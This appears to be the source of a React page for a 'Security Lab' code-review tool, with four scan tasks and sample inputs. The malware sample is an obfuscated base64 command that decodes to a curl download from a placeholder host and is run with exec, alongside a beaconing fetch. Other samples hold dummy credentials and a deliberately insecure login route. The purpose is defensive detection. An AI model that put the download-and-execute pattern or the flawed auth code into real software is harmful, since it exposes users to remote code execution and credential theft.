import FeatureWorkspace from "@/components/FeatureWorkspace";

const tasks = [
  {
    id: "secrets",
    label: "Secret Leakage",
    summary: "Find exposed credentials and sensitive configs.",
    whenToUse: "Use this before committing code, sharing logs, or deploying environment changes.",
    inputTitle: "Paste code, env samples, config, or logs",
    inputHint: "Paste configuration files, server logs, client code, or deployment variables.",
    outputs: ["Possible secrets", "Exposure risk", "Safe replacement steps"],
    example: `const firebaseConfig = {
  apiKey: "AIzaSyD-example",
  authDomain: "demo.firebaseapp.com"
};
const JWT_SECRET = "super-secret-dev-key";
mongoose.connect("mongodb://admin:pass123@localhost:27017/app");`,
    prompt:
      "Scan for secret leakage. Detect API keys, JWT secrets, Firebase configs, AWS credentials, database URLs, tokens, passwords, private keys, and sensitive logs. For each finding, explain exposure risk and how to rotate or move it safely.",
  },
  {
    id: "malware",
    label: "Malware Signals",
    summary: "Look for suspicious code behavior.",
    whenToUse: "Use this when reviewing unknown scripts, packages, build hooks, or copied code.",
    inputTitle: "Paste scripts, package hooks, or suspicious code",
    inputHint: "Include package.json scripts, install hooks, encoded strings, or network/file-system code.",
    outputs: ["Suspicious behavior", "Why it is risky", "Safe investigation steps"],
    example: `const { exec } = require("child_process");
const payload = Buffer.from("Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vc2g=", "base64").toString();
exec(payload);
setInterval(() => fetch("http://unknown-host.local/ping"), 1000);`,
    prompt:
      "Scan for malware indicators. Check suspicious scripts, obfuscated code, crypto miners, backdoors, unsafe downloads, persistence tricks, unexpected network calls, and remote execution. Separate confirmed risks from items that need manual verification.",
  },
  {
    id: "secure-code",
    label: "Secure Coding",
    summary: "Improve authentication, encryption, and queries.",
    whenToUse: "Use this to harden routes, database access, authentication, and user input handling.",
    inputTitle: "Paste backend route, controller, middleware, or query code",
    inputHint: "Include auth logic, validation, encryption, SQL/Mongo queries, and request handlers.",
    outputs: ["Vulnerabilities", "Safer code patterns", "Validation checklist"],
    example: `app.post("/login", async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  if (user.password === req.body.password) {
    res.json({ token: jwt.sign({ id: user._id }, "secret") });
  }
});`,
    prompt:
      "Suggest secure coding improvements for encryption, password storage, authentication, authorization, SQL queries, Mongo queries, input validation, rate limiting, error handling, and session or token safety. Include safer replacement examples where possible.",
  },
  {
    id: "quantum-security",
    label: "Quantum Security",
    summary: "Assess post-quantum cryptography risk.",
    whenToUse: "Use this for encryption-heavy systems, long-lived secrets, signatures, or compliance discussions.",
    inputTitle: "Paste cryptography code or security design notes",
    inputHint: "Include algorithms used, key sizes, token lifetimes, and what data must stay private long-term.",
    outputs: ["Classical risk", "Quantum-era risk", "Practical modernization path"],
    example: `Security design:
- RSA-2048 signs software update manifests.
- AES-256 encrypts customer exports.
- JWT signing uses HS256.
- Customer records must remain private for 15 years.`,
    prompt:
      "Check for weak cryptography and future quantum-vulnerable encryption. Compare classical risk with quantum-era risk, identify what is urgent versus future-facing, and suggest practical post-quantum migration steps without overclaiming certainty.",
  },
];

export default function SecurityLabPage() {
  return (
    <FeatureWorkspace
      title="Security Lab"
      description="Review code and configuration for leaked secrets, suspicious behavior, unsafe auth, weak queries, and cryptography risk."
      tasks={tasks}
    />
  );
}
